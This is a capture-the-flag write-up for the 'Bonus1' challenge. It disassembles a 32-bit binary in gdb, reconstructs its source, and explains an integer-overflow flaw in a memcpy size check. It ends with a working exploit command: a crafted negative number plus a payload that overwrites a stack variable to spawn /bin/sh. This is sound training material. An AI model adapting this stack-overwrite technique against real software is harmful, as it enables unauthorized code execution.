## Bonus1 - Int Overflow
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
    - #### Get used functions.
        ```c
            0x080482d4  _init
            0x08048320  memcpy
            0x08048330  __gmon_start__
            0x08048340  __libc_start_main
            0x08048350  execl
            0x08048360  atoi
            0x08048370  _start
            0x080483a0  __do_global_dtors_aux
            0x08048400  frame_dummy
            0x08048424  main
            0x080484b0  __libc_csu_init
            0x08048520  __libc_csu_fini
            0x08048522  __i686.get_pc_thunk.bx
            0x08048530  __do_global_ctors_aux
            0x0804855c  _fini
        ```
    - #### Assembly of main.
        ```c
            0x08048424 <+0>:     push   %ebp
            0x08048425 <+1>:     mov    %esp,%ebp
            0x08048427 <+3>:     and    $0xfffffff0,%esp
            0x0804842a <+6>:     sub    $0x40,%esp
            0x0804842d <+9>:     mov    0xc(%ebp),%eax
            0x08048430 <+12>:    add    $0x4,%eax
            0x08048433 <+15>:    mov    (%eax),%eax
            0x08048435 <+17>:    mov    %eax,(%esp)
            0x08048438 <+20>:    call   0x8048360 <atoi@plt>
            0x0804843d <+25>:    mov    %eax,0x3c(%esp)
            0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
            0x08048446 <+34>:    jle    0x804844f <main+43>
            0x08048448 <+36>:    mov    $0x1,%eax
            0x0804844d <+41>:    jmp    0x80484a3 <main+127>
            0x0804844f <+43>:    mov    0x3c(%esp),%eax
            0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
            0x0804845a <+54>:    mov    0xc(%ebp),%eax
            0x0804845d <+57>:    add    $0x8,%eax
            0x08048460 <+60>:    mov    (%eax),%eax
            0x08048462 <+62>:    mov    %eax,%edx
            0x08048464 <+64>:    lea    0x14(%esp),%eax <-
            0x08048468 <+68>:    mov    %ecx,0x8(%esp)
            0x0804846c <+72>:    mov    %edx,0x4(%esp)
            0x08048470 <+76>:    mov    %eax,(%esp)
            0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
            0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
            0x08048480 <+92>:    jne    0x804849e <main+122>
            0x08048482 <+94>:    movl   $0x0,0x8(%esp)
            0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
            0x08048492 <+110>:   movl   $0x8048583,(%esp)
            0x08048499 <+117>:   call   0x8048350 <execl@plt>
            0x0804849e <+122>:   mov    $0x0,%eax
            0x080484a3 <+127>:   leave  
            0x080484a4 <+128>:   ret 
        ```
        #### `main` calls `atoi`, passing it `argv[1]`
        ```c
        0x0804842d <+9>:     mov    0xc(%ebp),%eax
        0x08048430 <+12>:    add    $0x4,%eax
        0x08048433 <+15>:    mov    (%eax),%eax
        0x08048435 <+17>:    mov    %eax,(%esp)
        0x08048438 <+20>:    call   0x8048360 <atoi@plt>
        ```

        #### It then compares the returned number with `9` (`0x9` in hex), and returns if the number is greater than `9`

        ```c
        0x0804843d <+25>:    mov    %eax,0x3c(%esp)
        0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
        0x08048446 <+34>:    jle    0x804844f <main+43>
        0x08048448 <+36>:    mov    $0x1,%eax
        0x0804844d <+41>:    jmp    0x80484a3 <main+127>
        ```

        #### The result of `atoi` is stored at `0x3c(%esp)`.

        #### It then calculates the size to copy and the source pointer for `memcpy`

        ```c
        0x0804844f <+43>:    mov    0x3c(%esp),%eax
        0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
        0x0804845a <+54>:    mov    0xc(%ebp),%eax
        0x0804845d <+57>:    add    $0x8,%eax
        0x08048460 <+60>:    mov    (%eax),%eax
        0x08048462 <+62>:    mov    %eax,%edx
        ```

        #### If the returned number from `atoi` (is less then  `9`) will loaded into `eax`, then multiplied by `4` (`lea 0x0(,%eax,4),%ecx`) to get the size in bytes, this will be the size argument for `memcpy`. Separately, `0xc(%ebp)` plus `8` gives `argv[2]`, which is dereferenced and moved into `edx`, this will be the source pointer for `memcpy`.

        #### It then sets up and calls `memcpy`, copying into a buffer on the stack

        ```c
        0x08048464 <+64>:    lea    0x14(%esp),%eax <-
        0x08048468 <+68>:    mov    %ecx,0x8(%esp)
        0x0804846c <+72>:    mov    %edx,0x4(%esp)
        0x08048470 <+76>:    mov    %eax,(%esp)
        0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
        ```

        #### `eax` is set to `esp+0x14`, which is the destination buffer on the stack. The three arguments are placed in order for the call: the size (`ecx`) at `0x8(%esp)`, the source pointer (`edx`) at `0x4(%esp)`, and the destination (`eax`) at `(%esp)`. Then `memcpy` is called, copying `argv[2]` into the stack buffer, with the number of bytes controlled directly by the user-supplied size from `argv[1]`.

        #### It then checks if a specific `4` byte value was written into that size variable's slot, and if so executes a command

        ```c
        0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
        0x08048480 <+92>:    jne    0x804849e <main+122>
        0x08048482 <+94>:    movl   $0x0,0x8(%esp)
        0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
        0x08048492 <+110>:   movl   $0x8048583,(%esp)
        0x08048499 <+117>:   call   0x8048350 <execl@plt>
        ...
        (gdb) x/s 0x8048580
        0x8048580:       "sh"
        (gdb) x/s 0x8048583
        0x8048583:       "/bin/sh"
        (gdb)
        ```

        #### The value at `0x3c(%esp)` (the same slot where the `atoi` result was stored) is compared against the constant `0x574f4c46`. If it doesn't match (`jne`), execute returns `0`. If it does match, `execl` is called with two fixed string addresses as arguments, meaning the `memcpy` above must overflow far enough to overwrite this size variable with that exact value in order to trigger the `execl` call.

- #### Get the approximated source code.
    ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <unistd.h>

        int main(int ac, char **av) {
            char buffer[40];
            int size = atoi(av[1]);

            if (size > 9) {
                return 1;
            }

            memcpy(buffer, av[2], size * 4);

            // 0x574f4c46 translated to ASCII text is "FLOW"
            if (size == 0x574f4c46) {
                execl("/bin/sh", "sh", NULL); 
            }

            return 0;
        }

    ```
    #### We can't use a number more than `9`, and `9 * 4` is not enough to overwrite the number located after `buffer`.

    #### If we can write `44` to the stack, we can overwrite this number.

    #### The program accepts negative values, and this negative value will be multiplied by `4`. The result is still negative, but when it is passed to `memcpy`, it will be taken as an `unsigned int`, so it will overwrite the values after `buffer` if it's more than `40`. Actually, the number should be located right next to `buffer`, because `buffer` is located at `esp+0x14` (`esp+20`) and the number is stored at `esp+0x3c` (`esp+60`), so `60 - 20 = 40` matches the size of `buffer`.

    #### We need to input a negative value that, when multiplied by `4` and considered as `unsigned`, results in `44`.

    #### Math explination.
    ```math
        2^{32} = 4294967296
    ```

    ```math
         \text{Positive Twin} = \frac{4294967296*3+44}{4} = 3221225483   
    ```
    ```math
        3221225483 - 4294967296 = -1073741813
    ```
- #### detect the vulnrability type, Int Overflow.
- #### Solution command.
    - #### command
    ```sh
    ./bonus1 "-1073741813" $(python -c 'print("a"*10+"b"*10+"c"*10+"d"*10+"\x46\x4c\x4f\x57")')
    ```